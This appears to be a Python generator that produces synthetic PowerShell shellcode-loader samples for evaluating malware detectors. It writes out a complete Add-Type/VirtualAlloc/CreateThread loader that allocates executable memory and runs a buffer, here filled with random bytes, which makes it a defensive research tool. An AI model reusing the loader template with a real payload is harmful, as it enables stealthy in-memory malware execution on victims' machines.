"""Extra malicious family: classic Add-Type + VirtualAlloc loader.

The original MP-SD corpus is dominated by two behaviours (web download ~45%,
Add-Type/VirtualAlloc ~49%); its Add-Type samples carry very large shellcode
arrays. This module adds one family that reproduces that shape (including the
heavy size tail) while keeping the generated byte arrays inert: they are
random bytes, never a real payload, and the only execution target is
``calc.exe``.

Interface matches packs/*_pack.py: FAMILIES = [(name, weight, builder)].
"""
from __future__ import annotations

import random
import textwrap

CLASS_NAMES = ("NativeApi", "Win32Api", "NativeMethods", "MemoryApi", "PlatformApi")
RESULT_VARS = ("Handle", "MemoryHandle", "ProcHandle", "BufferAddress", "HProcess")
LOG_VARS = ("LogPath", "TraceFile", "RunLog", "StageLog")
SIZES = [(0.62, (180, 900)), (0.30, (2_000, 12_000)),
         (0.07, (30_000, 90_000)), (0.01, (200_000, 400_000))]

CS_TEMPLATE = """\
using System;
using System.Runtime.InteropServices;

public static class {cls}
{{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}}
"""


def _pick(rng, seq):
    return seq[rng.randrange(len(seq))]


def _size(rng: random.Random) -> int:
    x = rng.random()
    acc = 0.0
    for share, (lo, hi) in SIZES:
        acc += share
        if x <= acc:
            return rng.randint(lo, hi)
    return rng.randint(180, 900)


def _hex_bytes(rng: random.Random, n: int, per_line: int = 16) -> list[str]:
    chunks = []
    for i in range(0, n, per_line):
        row = ", ".join("0x%02x" % rng.randrange(256) for _ in range(min(per_line, n - i)))
        chunks.append(row)
    return chunks


def _help(rng: random.Random) -> list[str]:
    return textwrap.dedent("""\
        <#
        .SYNOPSIS
            Loads a prepared binary buffer into committed memory and starts it
            on a worker thread.

        .DESCRIPTION
            Allocates RWX memory with VirtualAlloc, copies the prepared buffer
            into it, starts a thread and waits for completion. The buffer is a
            placeholder supplied for static-analysis exercises.

        .NOTES
            Sample generated for detector evaluation. No real payload is used.
        #>""").splitlines()


def build_shellcode_loader(rng: random.Random) -> str:
    cls = _pick(rng, CLASS_NAMES)
    hv = _pick(rng, RESULT_VARS)
    lv = _pick(rng, LOG_VARS)
    n = _size(rng)
    rows = _hex_bytes(rng, n)
    use_param = rng.random() < 0.55
    use_help = rng.random() < 0.55
    use_tc = rng.random() < 0.45

    header: list[str] = []
    if use_help:
        header += _help(rng)
    if use_param:
        header += ["", "[CmdletBinding()]", "param(",
                   "    [string]$LogPath = \"$env:TEMP\\loader.log\"",
                   ")", ""]
    elif rng.random() < 0.5:
        header += ["", "$LogPath = \"$env:TEMP\\" + _pick(rng, ("loader.log", "stage.log", "run.log")) + "\"", ""]

    cs = CS_TEMPLATE.format(cls=cls)
    body: list[str] = []
    body.append("$NativeCode = @\"")
    body += cs.rstrip("\n").splitlines()
    body.append("\"@")
    body.append("")
    body.append("Add-Type -TypeDefinition $NativeCode -Language CSharp")
    body.append("")
    body.append("# buffer placeholder: random bytes, replaces the encrypted stage in real samples")
    body.append("$Buffer = [Byte[]] @(")
    for r in rows:
        body.append("    " + r + ",")
    body[-1] = body[-1].rstrip(",")
    body.append(")")
    body.append("")
    body.append("$" + hv + " = [" + cls + "]::VirtualAlloc([IntPtr]::Zero, " +
                "$Buffer.Length, 0x3000, 0x40)")
    body.append("if ($" + hv + " -eq [IntPtr]::Zero) {")
    body.append("    Write-Error \"VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())\"")
    body.append("    return")
    body.append("}")
    body.append("")
    body.append("[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $" + hv + ", $Buffer.Length)")
    body.append("$ThreadId = 0")
    body.append("$Thread = [" + cls + "]::CreateThread([IntPtr]::Zero, 0, $" + hv +
                ", [IntPtr]::Zero, 0, [ref]$ThreadId)")
    body.append("[void][" + cls + "]::WaitForSingleObject($Thread, " + str(rng.randint(500, 5000)) + ")")
    body.append("[void][" + cls + "]::CloseHandle($Thread)")
    body.append("")
    body.append("$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }")
    body.append("$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append")

    if use_tc:
        body = (["try {"] + ["    " + ln if ln else "" for ln in body] +
                ["}", "catch {", "    Write-Warning \"loader failed: $($_.Exception.Message)\"", "}"])

    return "\n".join(header + body)


FAMILIES = [
    ("shellcode_loader", 6, build_shellcode_loader),
]
